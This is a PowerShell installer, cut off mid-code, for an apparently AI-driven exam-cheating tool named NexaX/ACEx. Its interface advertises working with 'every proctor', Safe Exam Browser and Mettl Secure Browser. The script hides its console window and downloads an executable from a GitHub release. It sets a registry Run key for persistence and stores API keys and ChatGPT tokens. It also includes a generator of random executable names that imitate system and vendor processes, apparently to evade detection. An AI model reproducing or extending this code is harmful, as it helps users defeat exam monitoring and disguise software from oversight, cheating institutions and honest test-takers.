# =============================================================================
# NexaX Installer
# =============================================================================

param(
    [string]$Variant = 'Core'
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# =============================================================================
# UI FOUNDATION: console hide, premium panel, palette, helpers (from install2)
# =============================================================================
# Hide the PowerShell console when a graphical host is available.
try {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class AcExNativeWindow {
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    $console = [AcExNativeWindow]::GetConsoleWindow()
    if ($console -ne [IntPtr]::Zero) { [AcExNativeWindow]::ShowWindow($console, 0) | Out-Null }
}
catch { }

# --- Premium rounded panel with optional inward glow + crisp border ---
Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

public class PremiumPanel : Panel {
    private int   _radius  = 12;
    private Color _border  = Color.Transparent;
    private float _bw      = 1f;
    private bool  _glow    = false;
    private Color _glowClr = Color.Transparent;
    private int   _glowStr = 45;

    public int   Radius   { get { return _radius;  } set { _radius  = value; Invalidate(); } }
    public Color Border   { get { return _border;  } set { _border  = value; Invalidate(); } }
    public float BWidth   { get { return _bw;      } set { _bw      = value; Invalidate(); } }
    public bool  Glow     { get { return _glow;    } set { _glow    = value; Invalidate(); } }
    public Color GlowColor{ get { return _glowClr; } set { _glowClr = value; Invalidate(); } }
    public int   GlowStr  { get { return _glowStr; } set { _glowStr = value; Invalidate(); } }

    static GraphicsPath RR(Rectangle r, int rad) {
        var p = new GraphicsPath();
        if (rad <= 0) { p.AddRectangle(r); return p; }
        int d = rad * 2;
        p.AddArc(r.X,         r.Y,          d, d, 180, 90);
        p.AddArc(r.Right - d, r.Y,          d, d, 270, 90);
        p.AddArc(r.Right - d, r.Bottom - d, d, d,   0, 90);
        p.AddArc(r.X,         r.Bottom - d, d, d,  90, 90);
        p.CloseFigure();
        return p;
    }

    protected override void OnPaint(PaintEventArgs e) {
        base.OnPaint(e);
        var g = e.Graphics;
        g.SmoothingMode   = SmoothingMode.AntiAlias;
        g.PixelOffsetMode = PixelOffsetMode.HighQuality;

        using (var cp = RR(new Rectangle(0, 0, Width, Height), _radius))
            this.Region = new Region(cp);

        if (_glow && _glowClr.A > 0 && _glowStr > 0) {
            for (int i = 1; i <= 5; i++) {
                int al = Math.Min((_glowStr * i) / 5, 200);
                var gr = new Rectangle(i, i, Width - i*2 - 1, Height - i*2 - 1);
                using (var gp  = RR(gr, Math.Max(_radius - i, 1)))
                using (var pen = new Pen(Color.FromArgb(al, _glowClr), 1.5f))
                    g.DrawPath(pen, gp);
            }
        }

        if (_border.A > 0 && _bw > 0) {
            using (var bp  = RR(new Rectangle(0, 0, Width-1, Height-1), _radius))
            using (var pen = new Pen(_border, _bw))
                g.DrawPath(pen, bp);
        }
    }
}
"@ -ReferencedAssemblies System.Windows.Forms, System.Drawing

# --- Native window chrome helper (Windows 11+); falls back to rounded Region ---
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class ACExWindowChrome {
    [DllImport("dwmapi.dll", PreserveSig = true)]
    public static extern int DwmSetWindowAttribute(
        IntPtr hwnd,
        int attr,
        ref int value,
        int valueSize
    );
}
"@
}
catch { }

function Set-NativeRoundedWindow {
    param($window, [int]$fallbackRadius = 22)
    $nativeApplied = $false
    try {
        if ($window.IsHandleCreated -and ("ACExWindowChrome" -as [type])) {
            $pref = 2
            $hr = [ACExWindowChrome]::DwmSetWindowAttribute(
                $window.Handle,
                33,
                [ref]$pref,
                [Runtime.InteropServices.Marshal]::SizeOf([type][int])
            )
            $nativeApplied = ($hr -eq 0)
        }
    }
    catch { }
    if (-not $nativeApplied) {
        try { Set-RoundedRegion $window $fallbackRadius } catch { }
    }
    return $nativeApplied
}

# --- Global premium palette (deep navy-black) ---
$G_Bg0 = [System.Drawing.Color]::FromArgb(7, 8, 16)
$G_Bg1 = [System.Drawing.Color]::FromArgb(11, 13, 22)
$G_Bg2 = [System.Drawing.Color]::FromArgb(15, 18, 30)
$G_Bg3 = [System.Drawing.Color]::FromArgb(20, 24, 40)
$G_Bd1 = [System.Drawing.Color]::FromArgb(25, 31, 54)
$G_Bd2 = [System.Drawing.Color]::FromArgb(40, 48, 80)
$G_Bd3 = [System.Drawing.Color]::FromArgb(60, 72, 118)
$G_TxH = [System.Drawing.Color]::FromArgb(240, 242, 252)
$G_TxM = [System.Drawing.Color]::FromArgb(138, 146, 172)
$G_TxL = [System.Drawing.Color]::FromArgb(66, 74, 105)
$G_AccC = [System.Drawing.Color]::FromArgb(249, 115, 22)
$G_AccCL = [System.Drawing.Color]::FromArgb(251, 146, 60)
$G_AccL = [System.Drawing.Color]::FromArgb(124, 58, 237)
$G_AccLL = [System.Drawing.Color]::FromArgb(139, 92, 246)
$G_Green = [System.Drawing.Color]::FromArgb( 52, 211, 153)
$G_Amber = [System.Drawing.Color]::FromArgb(251, 191, 36)
$G_Red = [System.Drawing.Color]::FromArgb(248, 113, 113)
$G_Cyan = [System.Drawing.Color]::FromArgb(103, 232, 249)

function Enable-DoubleBuffer {
    param($ctrl)
    $ctrl.GetType().GetProperty(
        "DoubleBuffered",
        [System.Reflection.BindingFlags]::Instance -bor [System.Reflection.BindingFlags]::NonPublic
    ).SetValue($ctrl, $true, $null)
}

function Set-RoundedRegion {
    param($ctrl, $radius = 16)
    $r = $radius; $d = $r * 2
    $path = New-Object System.Drawing.Drawing2D.GraphicsPath
    $path.AddArc(0, 0, $d, $d, 180, 90)
    $path.AddArc($ctrl.Width - $d, 0, $d, $d, 270, 90)
    $path.AddArc($ctrl.Width - $d, $ctrl.Height - $d, $d, $d, 0, 90)
    $path.AddArc(0, $ctrl.Height - $d, $d, $d, 90, 90)
    $path.CloseFigure()
    $ctrl.Region = New-Object System.Drawing.Region($path)
}

# =============================================================================
# STEP 1 — VARIANT SELECTOR (card-based)
# =============================================================================
function Show-VariantSelector {
    param([string]$Default = 'Lite')
    $sf = New-Object System.Windows.Forms.Form
    $sf.Text = ""
    $sf.ClientSize = New-Object System.Drawing.Size(560, 488)
    $sf.StartPosition = "CenterScreen"
    $sf.FormBorderStyle = "None"
    $sf.BackColor = $G_Bg0
    $sf.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    $sf.AutoScaleMode = [System.Windows.Forms.AutoScaleMode]::None
    $sf.Padding = New-Object System.Windows.Forms.Padding(0)
    Enable-DoubleBuffer $sf

    $sf.Add_Load({ Set-RoundedRegion $sf 14 })
    $sf.Add_Paint({
            param($s, $e)
            $g = $e.Graphics
            $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
            $r = 14; $d = $r * 2
            $path = New-Object System.Drawing.Drawing2D.GraphicsPath
            $path.AddArc(1, 1, $d, $d, 180, 90)
            $path.AddArc($s.Width - $d - 2, 1, $d, $d, 270, 90)
            $path.AddArc($s.Width - $d - 2, $s.Height - $d - 2, $d, $d, 0, 90)
            $path.AddArc(1, $s.Height - $d - 2, $d, $d, 90, 90)
            $path.CloseFigure()
            $pen = New-Object System.Drawing.Pen($G_Bd2, 1.25)
            $g.DrawPath($pen, $path)
            $pen.Dispose(); $path.Dispose()
        })

    $tb = New-Object System.Windows.Forms.Panel
    $tb.Size = New-Object System.Drawing.Size(560, 42)
    $tb.Location = New-Object System.Drawing.Point(0, 0)
    $tb.BackColor = $G_Bg1
    Enable-DoubleBuffer $tb
    $tb.Add_Paint({
            param($s, $e)
            $pen = New-Object System.Drawing.Pen($G_Bd1, 1)
            $e.Graphics.DrawLine($pen, 0, $s.Height - 1, $s.Width, $s.Height - 1)
            $pen.Dispose()
        })
    $sf.Controls.Add($tb)

    $dotInfo = @(
        @{ X = 16; Clr = [System.Drawing.Color]::FromArgb(255, 96, 92) },
        @{ X = 36; Clr = [System.Drawing.Color]::FromArgb(255, 189, 46) },
        @{ X = 56; Clr = [System.Drawing.Color]::FromArgb( 40, 205, 65) }
    )
    $idx = 0
    foreach ($di in $dotInfo) {
        $dot = New-Object System.Windows.Forms.Panel
        $dot.Size = New-Object System.Drawing.Size(12, 12)
        $dot.Location = New-Object System.Drawing.Point($di.X, 15)
        $dot.BackColor = $di.Clr
        $dot.Cursor = "Hand"
        $dot.Add_Paint({
                param($s, $e)
                $e.Graphics.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
                $b = New-Object System.Drawing.SolidBrush($s.BackColor)
                $e.Graphics.FillEllipse($b, 0, 0, 11, 11)
                $b.Dispose()
            })
        if ($idx -eq 0) { $dot.Add_Click({ [System.Environment]::Exit(0) }) }
        $tb.Controls.Add($dot)
        $idx++
    }

    $tbLbl = New-Object System.Windows.Forms.Label
    $tbLbl.Text = "ACEx Installer"
    $tbLbl.ForeColor = $G_TxH
    $tbLbl.Font = New-Object System.Drawing.Font("Segoe UI", 10.5, [System.Drawing.FontStyle]::Bold)
    $tbLbl.Size = New-Object System.Drawing.Size(560, 42)
    $tbLbl.Location = New-Object System.Drawing.Point(0, 0)
    $tbLbl.TextAlign = "MiddleCenter"
    $tbLbl.BackColor = [System.Drawing.Color]::Transparent
    $tb.Controls.Add($tbLbl)

    $tbLbl.Add_MouseDown({ param($s, $e)
            if ($e.Button -eq "Left") {
                $script:sd = $true
                $script:sp = New-Object System.Drawing.Point($e.X, $e.Y)
            }
        })
    $tbLbl.Add_MouseMove({ param($s, $e)
            if ($script:sd) {
                $scr = [System.Windows.Forms.Cursor]::Position
                $sf.Location = New-Object System.Drawing.Point(
                    ([int]$scr.X - [int]$script:sp.X),
                    ([int]$scr.Y - [int]$script:sp.Y))
            }
        })
    $tbLbl.Add_MouseUp({ $script:sd = $false })

    $closeLbl = New-Object System.Windows.Forms.Label
    $closeLbl.Text = "x"
    $closeLbl.Font = New-Object System.Drawing.Font("Segoe UI", 15, [System.Drawing.FontStyle]::Bold)
    $closeLbl.ForeColor = $G_TxM
    $closeLbl.Size = New-Object System.Drawing.Size(34, 34)
    $closeLbl.Location = New-Object System.Drawing.Point(518, 4)
    $closeLbl.TextAlign = "MiddleCenter"
    $closeLbl.Cursor = "Hand"
    $closeLbl.BackColor = [System.Drawing.Color]::Transparent
    $closeLbl.TabStop = $false
    $closeLbl.Add_MouseEnter({ $closeLbl.ForeColor = $G_Red; $closeLbl.BackColor = [System.Drawing.Color]::FromArgb(24, 248, 113, 113) })
    $closeLbl.Add_MouseLeave({ $closeLbl.ForeColor = $G_TxM; $closeLbl.BackColor = [System.Drawing.Color]::Transparent })
    $closeLbl.Add_Click({ [System.Environment]::Exit(0) })
    $tb.Controls.Add($closeLbl)
    $closeLbl.BringToFront()

    $script:sd = $false; $script:sp = [System.Drawing.Point]::Empty
    $tb.Add_MouseDown({ param($s, $e)
            if ($e.Button -eq "Left") { $script:sd = $true; $script:sp = New-Object System.Drawing.Point($e.X, $e.Y) }
        })
    $tb.Add_MouseMove({ param($s, $e)
            if ($script:sd) {
                $scr = [System.Windows.Forms.Cursor]::Position
                $sf.Location = New-Object System.Drawing.Point(
                    ([int]$scr.X - [int]$script:sp.X),
                    ([int]$scr.Y - [int]$script:sp.Y))
            }
        })
    $tb.Add_MouseUp({ $script:sd = $false })

    $cn = New-Object System.Windows.Forms.Panel
    $cn.Size = New-Object System.Drawing.Size(560, 446)
    $cn.Location = New-Object System.Drawing.Point(0, 42)
    $cn.BackColor = $G_Bg0
    Enable-DoubleBuffer $cn
    $cn.Add_Paint({
            param($s, $e)
            $b = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(16, 20, 42))
            for ($gx = 18; $gx -lt $s.Width; $gx += 22) {
                for ($gy = 10; $gy -lt $s.Height; $gy += 22) {
                    $e.Graphics.FillEllipse($b, $gx, $gy, 2, 2)
                }
            }
            $b.Dispose()
        })
    $sf.Controls.Add($cn)

    $step = New-Object System.Windows.Forms.Label
    $step.Text = "STEP 1  .  EDITION"
    $step.Font = New-Object System.Drawing.Font("Segoe UI", 7, [System.Drawing.FontStyle]::Bold)
    $step.ForeColor = $G_TxL
    $step.Size = New-Object System.Drawing.Size(500, 16)
    $step.Location = New-Object System.Drawing.Point(30, 18)
    $step.TextAlign = "MiddleLeft"
    $cn.Controls.Add($step)

    $hd = New-Object System.Windows.Forms.Label
    $hd.Text = "Choose your edition"
    $hd.Font = New-Object System.Drawing.Font("Segoe UI", 19, [System.Drawing.FontStyle]::Bold)
    $hd.ForeColor = $G_TxH
    $hd.Size = New-Object System.Drawing.Size(500, 38)
    $hd.Location = New-Object System.Drawing.Point(30, 36)
    $hd.AutoSize = $false
    $hd.TextAlign = "MiddleLeft"
    $cn.Controls.Add($hd)

    $sh = New-Object System.Windows.Forms.Label
    $sh.Text = "Select the build that fits your workflow."
    $sh.Font = New-Object System.Drawing.Font("Segoe UI", 9.5)
    $sh.ForeColor = $G_TxM
    $sh.Size = New-Object System.Drawing.Size(500, 24)
    $sh.Location = New-Object System.Drawing.Point(30, 74)
    $sh.AutoSize = $false
    $sh.TextAlign = "MiddleLeft"
    $cn.Controls.Add($sh)

    $script:selIdx = if ($Default -eq 'Core') { 0 } else { 1 }

    $cSelBg = [System.Drawing.Color]::FromArgb(22, 12, 4)
    $lSelBg = [System.Drawing.Color]::FromArgb(14, 10, 28)
    $unselBg = $G_Bg2

    $cCard = New-Object PremiumPanel
    $cCard.Size = New-Object System.Drawing.Size(240, 198)
    $cCard.Location = New-Object System.Drawing.Point(30, 108)
    $cCard.BackColor = $unselBg
    $cCard.Radius = 14
    $cCard.Border = $G_Bd1
    $cCard.BWidth = 1
    $cCard.Cursor = "Hand"
    $cCard.Tag = 0
    $cCard.Add_Paint({
            param($s, $e)
            $g = $e.Graphics
            $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
            $g.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit
            $sr = New-Object System.Drawing.Rectangle(0, 0, $s.Width, 4)
            $sb = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
                $sr,
                [System.Drawing.Color]::FromArgb(249, 115, 22),
                [System.Drawing.Color]::FromArgb(251, 146, 60),
                [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
            $g.FillRectangle($sb, $sr); $sb.Dispose()
            $bF = New-Object System.Drawing.Font("Segoe UI", 7, [System.Drawing.FontStyle]::Bold)
            $bB = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(249, 115, 22))
            $g.DrawString("ALL PROCTORS", $bF, $bB, [float]14, [float]14)
            $bF.Dispose(); $bB.Dispose()
            $nF = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
            $nB = New-Object System.Drawing.SolidBrush($G_TxH)
            $g.DrawString("ACEx Core", $nF, $nB, [float]14, [float]31)
            $nF.Dispose(); $nB.Dispose()
            $dF = New-Object System.Drawing.Font("Segoe UI", 8.5)
            $dB = New-Object System.Drawing.SolidBrush($G_TxM)
            $g.DrawString("BYOK  .  Full AI Toolkit", $dF, $dB, [float]14, [float]55)
            $dp = New-Object System.Drawing.Pen($G_Bd2, 1)
            $g.DrawLine($dp, 14, 73, $s.Width - 14, 73); $dp.Dispose()
            $feats = @("Bring Your Own Key (BYOK)", "Mouse answer mode", "Works with every proctor", "Native DLL suite")
            for ($i = 0; $i -lt 4; $i++) {
                $fy = [float](80 + $i * 25)
                $ckP = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(249, 115, 22), 1.5)
                $g.DrawLine($ckP, [float]16, $fy + [float]9, [float]20, $fy + [float]13)
                $g.DrawLine($ckP, [float]20, $fy + [float]13, [float]28, $fy + [float]5)
                $ckP.Dispose()
                $g.DrawString($feats[$i], $dF, $dB, [float]36, $fy)
            }
            $dF.Dispose(); $dB.Dispose()
        })
    $cn.Controls.Add($cCard)

    $lCard = New-Object PremiumPanel
    $lCard.Size = New-Object System.Drawing.Size(240, 198)
    $lCard.Location = New-Object System.Drawing.Point(290, 108)
    $lCard.BackColor = $lSelBg
    $lCard.Radius = 14
    $lCard.Border = $G_AccL
    $lCard.BWidth = 1.5
    $lCard.Glow = $true
    $lCard.GlowColor = $G_AccL
    $lCard.GlowStr = 42
    $lCard.Cursor = "Hand"
    $lCard.Tag = 1
    $lCard.Add_Paint({
            param($s, $e)
            $g = $e.Graphics
            $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
            $g.TextRenderingHint = [System.Drawing.Text.TextRenderingHint]::ClearTypeGridFit
            $sr = New-Object System.Drawing.Rectangle(0, 0, $s.Width, 4)
            $sb = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
                $sr,
                [System.Drawing.Color]::FromArgb(124, 58, 237),
                [System.Drawing.Color]::FromArgb(139, 92, 246),
                [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
            $g.FillRectangle($sb, $sr); $sb.Dispose()
            $chipR = New-Object System.Drawing.Rectangle(($s.Width - 106), 9, 92, 18)
            $chipPath = New-Object System.Drawing.Drawing2D.GraphicsPath
            $cr = 9; $cd = $cr * 2
            $chipPath.AddArc($chipR.X, $chipR.Y, $cd, $cd, 180, 90)
            $chipPath.AddArc($chipR.Right - $cd, $chipR.Y, $cd, $cd, 270, 90)
            $chipPath.AddArc($chipR.Right - $cd, $chipR.Bottom - $cd, $cd, $cd, 0, 90)
            $chipPath.AddArc($chipR.X, $chipR.Bottom - $cd, $cd, $cd, 90, 90)
            $chipPath.CloseFigure()
            $chipBr = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(34, 124, 58, 237))
            $g.FillPath($chipBr, $chipPath); $chipBr.Dispose()
            $chipPen = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(84, 124, 58, 237), 1)
            $g.DrawPath($chipPen, $chipPath); $chipPen.Dispose()
            $rcF = New-Object System.Drawing.Font("Segoe UI", 5.25, [System.Drawing.FontStyle]::Bold)
            $rcB = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(174, 151, 255))
            $rcFm = New-Object System.Drawing.StringFormat
            $rcFm.Alignment = [System.Drawing.StringAlignment]::Center
            $rcFm.LineAlignment = [System.Drawing.StringAlignment]::Center
            $g.DrawString("RECOMMENDED", $rcF, $rcB, [System.Drawing.RectangleF]::op_Implicit($chipR), $rcFm)
            $rcF.Dispose(); $rcB.Dispose(); $rcFm.Dispose(); $chipPath.Dispose()
            $bF = New-Object System.Drawing.Font("Segoe UI", 7, [System.Drawing.FontStyle]::Bold)
            $bB = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(124, 58, 237))
            $g.DrawString("SEB / MSB", $bF, $bB, [float]14, [float]14)
            $bF.Dispose(); $bB.Dispose()
            $nF = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
            $nB = New-Object System.Drawing.SolidBrush($G_TxH)
            $g.DrawString("ACEx Lite", $nF, $nB, [float]14, [float]31)
            $nF.Dispose(); $nB.Dispose()
            $dF = New-Object System.Drawing.Font("Segoe UI", 8.5)
            $dB = New-Object System.Drawing.SolidBrush($G_TxM)
            $g.DrawString("Browser  .  Lightweight", $dF, $dB, [float]14, [float]55)
            $dp = New-Object System.Drawing.Pen($G_Bd2, 1)
            $g.DrawLine($dp, 14, 73, $s.Width - 14, 73); $dp.Dispose()
            $feats = @("Safe Exam Browser (SEB)", "Mettl Secure Browser (MSB)", "Full browser support", "Lightweight  .  Fast startup")
            for ($i = 0; $i -lt 4; $i++) {
                $fy = [float](80 + $i * 25)
                $ckP = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(124, 58, 237), 1.5)
                $g.DrawLine($ckP, [float]16, $fy + [float]9, [float]20, $fy + [float]13)
                $g.DrawLine($ckP, [float]20, $fy + [float]13, [float]28, $fy + [float]5)
                $ckP.Dispose()
                $g.DrawString($feats[$i], $dF, $dB, [float]36, $fy)
            }
            $dF.Dispose(); $dB.Dispose()
        })
    $cn.Controls.Add($lCard)

    $cCard.Add_Click({
            $script:selIdx = 0
            $cCard.BackColor = $cSelBg; $cCard.Border = $G_AccC
            $cCard.BWidth = 1.5; $cCard.Glow = $true
            $cCard.GlowColor = $G_AccC; $cCard.GlowStr = 42
            $lCard.BackColor = $unselBg; $lCard.Border = $G_Bd1
            $lCard.BWidth = 1; $lCard.Glow = $false
            $cCard.Refresh(); $lCard.Refresh()
            $btnP.BackColor = $G_AccC
        })
    $lCard.Add_Click({
            $script:selIdx = 1
            $lCard.BackColor = $lSelBg; $lCard.Border = $G_AccL
            $lCard.BWidth = 1.5; $lCard.Glow = $true
            $lCard.GlowColor = $G_AccL; $lCard.GlowStr = 42
            $cCard.BackColor = $unselBg; $cCard.Border = $G_Bd1
            $cCard.BWidth = 1; $cCard.Glow = $false
            $lCard.Refresh(); $cCard.Refresh()
            $btnP.BackColor = $G_AccL
        })

    $sep = New-Object System.Windows.Forms.Panel
    $sep.Size = New-Object System.Drawing.Size(500, 1)
    $sep.Location = New-Object System.Drawing.Point(30, 318)
    $sep.BackColor = $G_Bd1
    $cn.Controls.Add($sep)

    $btnP = New-Object System.Windows.Forms.Panel
    $btnP.Size = New-Object System.Drawing.Size(500, 48)
    $btnP.Location = New-Object System.Drawing.Point(30, 332)
    $btnP.BackColor = if ($script:selIdx -eq 0) { $G_AccC } else { $G_AccL }
    $btnP.Cursor = "Hand"
    Enable-DoubleBuffer $btnP
    $btnP.Add_HandleCreated({
            $r = 10; $d = $r * 2
            $path = New-Object System.Drawing.Drawing2D.GraphicsPath
            $path.AddArc(0, 0, $d, $d, 180, 90)
            $path.AddArc($btnP.Width - $d, 0, $d, $d, 270, 90)
            $path.AddArc($btnP.Width - $d, $btnP.Height - $d, $d, $d, 0, 90)
            $path.AddArc(0, $btnP.Height - $d, $d, $d, 90, 90)
            $path.CloseFigure()
            $btnP.Region = New-Object System.Drawing.Region($path)
        })
    $btnP.Add_MouseEnter({ $btnP.BackColor = if ($script:selIdx -eq 0) { $G_AccCL } else { $G_AccLL } })
    $btnP.Add_MouseLeave({ $btnP.BackColor = if ($script:selIdx -eq 0) { $G_AccC } else { $G_AccL } })

    $btnL = New-Object System.Windows.Forms.Label
    $btnL.Text = "Continue  ->"
    $btnL.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
    $btnL.ForeColor = [System.Drawing.Color]::White
    $btnL.Size = $btnP.Size
    $btnL.Location = New-Object System.Drawing.Point(0, 0)
    $btnL.TextAlign = "MiddleCenter"
    $btnL.Cursor = "Hand"
    $btnP.Controls.Add($btnL)
    $cn.Controls.Add($btnP)

    $script:selectedVariant = $null
    $btnP.Add_Click({
            $script:selectedVariant = if ($script:selIdx -eq 0) { "Core" } else { "Lite" }
            $sf.Close()
        })
    $btnL.Add_Click({
            $script:selectedVariant = if ($script:selIdx -eq 0) { "Core" } else { "Lite" }
            $sf.Close()
        })

    $note = New-Object System.Windows.Forms.Label
    $note.Text = "Switch editions anytime by re-running the installer"
    $note.Font = New-Object System.Drawing.Font("Segoe UI", 8)
    $note.ForeColor = $G_TxL
    $note.Size = New-Object System.Drawing.Size(500, 18)
    $note.Location = New-Object System.Drawing.Point(30, 390)
    $note.TextAlign = "MiddleCenter"
    $cn.Controls.Add($note)

    $sf.Add_FormClosing({
            param($s, $ea)
            if (-not $script:selectedVariant) { [System.Environment]::Exit(0) }
        })
    $sf.ShowDialog() | Out-Null
    return $script:selectedVariant
}

# =============================================================================
# INSTALLATION SETUP & ACCENT
# =============================================================================
$Variant = 'Core'
$SelectedVariant = 'Core'
$VariantLabel = ''
$AccentColor = $G_AccC
$AccentColorLight = $G_AccCL

# =============================================================================
# CONFIGURATION
# =============================================================================

$Config = @{
    BrandName           = 'NexaX'
    InternalFolder      = 'NexaX'
    ShortcutName        = 'NexaX'
    FolderShortcutName  = 'NexaX folder'
    RegistryRunKeyName  = 'NexaX'
    ExeUrl              = 'https://github.com/fghjhghnjj/cocu/releases/download/jjj/NexaX.exe'
}

$BrandName = $Config.BrandName
$InternalFolder = $Config.InternalFolder
$ShortcutName = $Config.ShortcutName
$FolderShortcutName = $Config.FolderShortcutName
$RegistryRunKeyName = $Config.RegistryRunKeyName
$ExeUrl = $Config.ExeUrl
$DllUrl = $null
$Dll2Url = $null
$WebView2LoaderUrl = $null

# =============================================================================
# COMMON PATHS
# =============================================================================

$InstallDir = Join-Path $env:APPDATA $InternalFolder
$MetaPath = Join-Path $InstallDir "install.json"

$DesktopDir = [Environment]::GetFolderPath("Desktop")
$ShortcutPath = Join-Path $DesktopDir "$ShortcutName.lnk"
$FolderShortcutPath = Join-Path $DesktopDir "$FolderShortcutName.lnk"

# Download URLs are variant-specific (set from $Config above).

# Legacy paths (for cleanup, same for both Core and Lite)
$LegacyLiteralName = "acex.exe"
$LegacyRunKeyNames = @("ACEx", "ACExOld", "ACEx-Legacy", "Blackbird")
$LegacyDirs = @(
    (Join-Path $env:APPDATA "ACEx"),
    (Join-Path $env:APPDATA "ACExAgent")
)
$LegacyShortcuts = @(
    (Join-Path $DesktopDir "ACEx.lnk"),
    (Join-Path $DesktopDir "ACEx Agent.lnk"),
    (Join-Path $DesktopDir "ACEx-Legacy.lnk"),
    (Join-Path $DesktopDir "Blackbird.lnk"),
    (Join-Path $DesktopDir "Blackbird folder.lnk")
)

$DataFiles = @("apikeys.dat", "chatgpt_tokens.dat", "hotkeys.json", "config.json")
$DataDirs = @("memory")

$LegacyChatHistory = Join-Path $DesktopDir "ACEx-chat-history"
$NewChatHistory = Join-Path $DesktopDir "ACEx-chat-history"
$LegacyWorkspace = Join-Path $DesktopDir "ACExAgentWorkspace"
$NewWorkspace = Join-Path $DesktopDir "ACExWorkspace"

# =============================================================================
# RANDOMIZED EXE NAME GENERATOR
# =============================================================================

function New-RandomACExExeName {
    $includeTokens = @(
        "msedgewebview2", "syntpenh", "pickerhost", "aqauserps",
        "pangpa", "besclientui", "smarthytetelemetry", "mcuicnt"
    )
    $vendorPrefixes = @("intel", "amd", "realtek", "ms", "win", "sys", "logi")
    $helperTokens = @(
        "audiosrv", "displaysvc", "ipcservice", "rendererhost",
        "cachemanager", "fontagent", "trayhost", "shellhost",
        "compositor", "indexsvc", "metadataagent", "syncbroker",
        "telemetryagent", "policyhost", "sessionhost", "diaghost"
    )

    function _suffix {
        $style = Get-Random -Min 0 -Max 3
        switch ($style) {
            0 { $pool = (48..57);              $len = Get-Random -Min 3 -Max 6 }
            1 { $pool = (97..122);             $len = Get-Random -Min 4 -Max 7 }
            default { $pool = ((97..122) + (48..57)); $len = Get-Random -Min 4 -Max 8 }
        }
        return (-join ($pool | Get-Random -Count $len | ForEach-Object { [char]$_ }))
    }

    $wl = $includeTokens | Get-Random
    $vendor = $vendorPrefixes | Get-Random
    $helper = $helperTokens | Get-Random
    $suf = _suffix

    $pat = Get-Random -Min 0 -Max 8
    switch ($pat) {
        0 { return "${wl}_${suf}.exe" }
        1 { return "${wl}-${suf}.exe" }
        2 { return "${vendor}${wl}.exe" }
        3 { return "${vendor}-${wl}-${suf}.exe" }
        4 { return "${helper}${wl}.exe" }
        5 { return "${wl}${helper}${suf}.exe" }
        6 { return "svc${wl}${suf}.exe" }
        7 { return "${wl}.${suf}.exe" }
    }
}

# Exe name
$AppExeName = "NexaX.exe"

$ExePath = Join-Path $InstallDir $AppExeName
$WebView2LoaderPath = Join-Path $InstallDir "WebView2Loader.dll"

# Lite downloads Dll1/Dll2 into a temp working folder; Core keeps them in the install dir.
if ($Variant -eq 'Lite') {
    $TempAcExDir = Join-Path $env:TEMP "ACEx"
    if (-not (Test-Path $TempAcExDir)) {
        New-Item -ItemType Directory -Path $TempAcExDir -Force | Out-Null
    }
    $DllPath = Join-Path $TempAcExDir "Dll1.dll"
    $Dll2Path = Join-Path $TempAcExDir "Dll2.dll"
}
else {
    $DllPath = Join-Path $InstallDir "Dll1.dll"
    $Dll2Path = Join-Path $InstallDir "Dll2.dll"
}

# =============================================================================
# PREMIUM UI COLOR PALETTE
# =============================================================================

$BrandOrange     = [System.Drawing.Color]::FromArgb(249,115,22)
$BrandOrangeDark = [System.Drawing.Color]::FromArgb(234,88,12)
$BrandOrangeLight = [System.Drawing.Color]::FromArgb(251,146,60)
$DeepDark        = [System.Drawing.Color]::FromArgb(10,10,18)
$DarkSurface     = [System.Drawing.Color]::FromArgb(20,20,35)
$CardSurface     = [System.Drawing.Color]::FromArgb(28,28,45)
$CardSurfaceLight = [System.Drawing.Color]::FromArgb(35,35,55)
$BorderSubtle    = [System.Drawing.Color]::FromArgb(50,50,75)
$BorderGlow      = [System.Drawing.Color]::FromArgb(249,115,22)
$TextPrimary     = [System.Drawing.Color]::FromArgb(240,240,250)
$TextSecondary   = [System.Drawing.Color]::FromArgb(140,140,170)
$TextMuted       = [System.Drawing.Color]::FromArgb(80,80,100)
$SuccessGreen    = [System.Drawing.Color]::FromArgb(52,211,153)
$WarningAmber    = [System.Drawing.Color]::FromArgb(251,191,36)
$ErrorRed        = [System.Drawing.Color]::FromArgb(239,68,68)
$AccentBlue      = [System.Drawing.Color]::FromArgb(59,130,246)

# =============================================================================
# CUSTOM ROUNDED PANEL CONTROL
# =============================================================================

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

public class RoundedPanel : Panel {
    private int _cornerRadius = 12;
    private Color _borderColor = Color.FromArgb(50,50,75);
    private int _borderWidth = 1;

    public int CornerRadius {
        get { return _cornerRadius; }
        set { _cornerRadius = value; this.Invalidate(); }
    }

